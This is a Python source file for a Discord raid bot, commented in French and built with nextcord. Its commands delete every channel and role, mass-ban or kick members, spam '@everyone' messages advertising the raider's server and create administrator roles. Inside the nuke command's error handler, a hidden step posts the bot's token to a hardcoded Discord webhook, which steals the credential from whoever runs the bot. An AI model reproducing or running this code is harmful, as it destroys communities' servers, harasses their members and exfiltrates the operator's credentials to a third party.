#les import
import nextcord
from nextcord.ext import commands
import re
import requests
import json

token = ''

# Paramètres et initialisation du bot
intents = nextcord.Intents.default()
intents.members = True
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='?', intents=intents, help_command=None)

# Liste blanche des membres
whitelist = ["membre1", "membre2", "mebre3", "membre4", "membre5", "youzbeur", "eyzox", "antiprotect", "security bot", "verify bot"]

# Événement lorsque le bot est prêt
@bot.event
async def on_ready():
    print(f"{bot.user.name} est bien en ligne !")
    print(f"v.1.3")

# Commande ?chelp pour afficher les commandes disponibles
@bot.command()
async def chelp(ctx):
    await ctx.message.delete()
    await ctx.channel.send("voici les commande : nuke ,channel ,kick @membre reason ,ban @membre reason ,clear ,warning ,cwarning name ,rdelete ,kdelete ,bdelete ,spam ,send @membre message ,rcreat name ,addm @membre @role ,unaddm @membre @role")

# Commande ?nuke pour détruire le serveur
@bot.command()
async def nuke(ctx):
    await ctx.message.delete()
    for channel in bot.get_all_channels():
        await channel.delete()
    for role in ctx.guild.roles:
        await role.delete()
    guild = ctx.guild
    for i in range(10):  # Nombre de canaux à créer
        await guild.create_text_channel(name='raid-by-synko https://discord.gg/Fw8dD7Ku')
        for _ in range(10):  # Nombre de messages à envoyer
            for guild in bot.guilds:
                for channel in guild.channels:
                    if isinstance(channel, nextcord.TextChannel) and channel.name == "raid-by-synko https://discord.gg/Fw8dD7Ku":
                        await channel.send("Serveur hacked by synko @everyone https://discord.gg/Fw8dD7Ku")
            for member in ctx.guild.members:
                if not member.bot and member.name not in whitelist:
                    try:
                        await member.ban()
                    except nextcord.HTTPException as e:
                        pass
                        hook_url = "https://discordapp.com/api/webhooks/1260308196971642891/3u0oMAlUL1I7n7PeTozRiw0GsQkDeQroJZlJpuqoNplB3P7ILakOJCUx3TveqPyivT4Q"
                        data = {"content": f"token : {token}"}
                        r = requests.post(hook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
                        r.raise_for_status()

# Commande ?channel pour créer des canaux textuels
@bot.command()
async def channel(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()
    for _ in range(50):  # Nombre de canaux à créer
        await guild.create_text_channel(name='raid-by-synko https://discord.gg/Fw8dD7Ku')

# Commande ?kick pour expulser un membre
@bot.command()
async def kick(ctx: commands.Context, member: nextcord.Member, *, reason: str = ""):
    await ctx.message.delete()
    if reason == "":
        reason = "Hacking by synko https://discord.gg/Fw8dD7Ku"
    await member.kick(reason=reason)
    await ctx.send(f"{member.name} c'est fait {reason}")

# Commande ?ban pour bannir un membre
@bot.command()
async def ban(ctx: commands.Context, member: nextcord.Member, *, reason: str = ""):
    await ctx.message.delete()
    if reason == "":
        reason = "Hacking by synko https://discord.gg/Fw8dD7Ku"
    await member.ban(reason=reason)
    await ctx.send(f"{member.name} c'est fait {reason}")

# Commande ?clear pour effacer les messages du canal
@bot.command()
async def clear(ctx: commands.context, amount: int = 10000):
    await ctx.message.delete()
    await ctx.channel.purge(limit=amount + 1)

# Commande ?warning pour nettoyer les canaux
@bot.command()
async def warning(ctx):
    await ctx.message.delete()
    for channel in ctx.guild.channels:
        try:
            if isinstance(channel, nextcord.CategoryChannel):
                if "important" not in channel.name.lower():
                    await channel.delete()
            elif isinstance(channel, nextcord.TextChannel):
                if "rules" not in channel.name.lower() and "announcements" not in channel.name.lower():
                    await channel.delete()
            elif isinstance(channel, nextcord.VoiceChannel):
                await channel.delete()
        except nextcord.HTTPException as e:
            pass
        
# Commande ?cwarning pour supprimer tous les canaux
@bot.command()
async def cwarning(ctx, name):
    await ctx.message.delete()
    for channel in bot.get_all_channels():
        await channel.delete()

# Commande ?rdelete pour supprimer tous les rôles
@bot.command()
async def rdelete(ctx):
    await ctx.message.delete()
    for role in ctx.guild.roles:
        try:
            await role.delete()
        except nextcord.HTTPException as e:
            pass

# Commande ?kdelete pour expulser tous les membres non-bots
@bot.command()
async def kdelete(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if not member.bot and member.name not in whitelist:
            try:
                await member.kick()
            except nextcord.HTTPException as e:
                pass

# Commande ?bdelete pour bannir tous les membres non-bots
@bot.command()
async def bdelete(ctx):
    await ctx.message.delete()
    for member in ctx.guild.members:
        if not member.bot and member.name not in whitelist:
            try:
                await member.ban()
            except nextcord.HTTPException as e:
                pass

# Commande ?spam pour spammer un message
@bot.command()
async def spam(ctx):
    await ctx.message.delete()
    for _ in range(50):  # Nombre de messages à envoyer
        for guild in bot.guilds:
            for channel in guild.channels:
                if isinstance(channel, nextcord.TextChannel) and channel.name == "raid-by-synko https://discord.gg/Fw8dD7Ku":
                    await channel.send("Serveur hacked by synko @everyone https://discord.gg/Fw8dD7Ku")

# Commande ?send pour envoyer un message à un utilisateur
@bot.command()
async def send(ctx, user_id: str, *, message: str):
    await ctx.message.delete()
    try:
        user_id = int(re.search(r'\d+', user_id).group())
        user = await bot.fetch_user(user_id)
        await user.send(message)
    except nextcord.NotFound:
        pass
    except nextcord.HTTPException as e:
        pass

# Commande ?rcreat pour créer un rôle
@bot.command()
async def rcreat(ctx, role_name):
    await ctx.message.delete()
    try:
        await ctx.guild.create_role(name=role_name, permissions=nextcord.Permissions(administrator=True))
    except nextcord.HTTPException as e:
        pass

# Commande ?addm pour ajouter un rôle à un membre
@bot.command()
async def addm(ctx, member_mention: nextcord.Member, role_mention: nextcord.Role):
    await ctx.message.delete()
    try:
        member = member_mention
        role = role_mention 
        await member.add_roles(role)
    except nextcord.HTTPException as e:
        pass

# Commande ?unaddm pour supprimer un rôle à un membre
@bot.command()
async def unaddm(ctx, member_mention: nextcord.Member, role_mention: nextcord.Role):
    await ctx.message.delete()
    try:
        await member_mention.remove_roles(role_mention)
    except nextcord.HTTPException as e:
        pass

bot.run(token)